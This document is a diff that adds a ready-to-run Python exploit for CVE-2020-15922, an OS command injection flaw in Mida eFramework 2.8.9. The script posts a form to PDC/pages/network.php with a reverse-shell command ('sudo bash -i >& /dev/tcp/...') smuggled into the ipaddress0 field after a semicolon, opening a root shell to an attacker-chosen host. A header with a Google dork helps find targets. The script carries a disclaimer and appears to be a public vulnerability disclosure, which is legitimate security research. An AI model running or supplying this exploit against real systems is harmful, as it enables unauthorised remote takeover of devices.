@@ -1,0 +1,78 @@
+# Exploit Title: Mida eFramework 2.8.9 - Remote Code Execution
+# Google Dork: Server: Mida eFramework
+# Date: 2020-08-27
+# Exploit Author: elbae
+# Vendor Homepage: https://www.midasolutions.com/
+# Software Link: http://ova-efw.midasolutions.com/
+# Reference: https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
+# Version: <= 2.8.9
+# CVE : CVE-2020-15922
+
+
+#! /usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import argparse
+import base64
+import random
+import requests
+import subprocess
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def print_disclaimer():
+    print("""
+    ---------------------
+    Disclaimer:
+    1) For testing purpose only.
+    2) Do not attack production environments.
+    3) Intended for educational purposes only and cannot be used for law
+violation or personal gain.
+    4) The author is not responsible for any possible harm caused by this
+material.
+    ---------------------""")
+
+
+def print_info():
+    print("""
+[*] PoC exploit for Mida eFramework 2.8.9 PDC (CVE-2020-15922)
+[*] Reference:https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
+[*] Vulnerability: OS Command Injection RCE in PDC/pages/network.php -
+Reverse Shell
+    ./CVE-2020-15922 http://192.168.1.60:8090/PDC/pages/network.php rev-IP
+rev-PORT """)
+
+def run_cmd(url,ip,port):
+    rev_shell = "sudo bash -i >& /dev/tcp/{0}/{1} 0>&1".format(ip,port)
+    print("[+] Reverse shell: {0}".format(rev_shell))
+    data = {
+        "submit":"True",
+        "ipaddress0":"; {0}".format(rev_shell),
+        "netmask0":"",
+        "gateway0":"",
+        "dns1":"",
+        "dns2":""
+    }
+    # exec rev shell
+    print("[*] Starting reverse shell to {0} {1}...".format(ip,port))
+    try:
+        r = requests.post(url,data=data,verify=False,timeout=1)
+    except requests.exceptions.ReadTimeout:
+        print("[?] ...check if it worked")
+        pass
+
+def main():
+    print_info()
+    print_disclaimer()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("target", type=str,
+        help="the complete target URL")
+    parser.add_argument("ip", type=str,
+        help="the ip address for reverse shell")
+    parser.add_argument("port", type=str,
+        help="the port for reverse shell")
+    args = parser.parse_args()
+    run_cmd(args.target, args.ip, args.port)
+
+if __name__ == '__main__':
+    main()
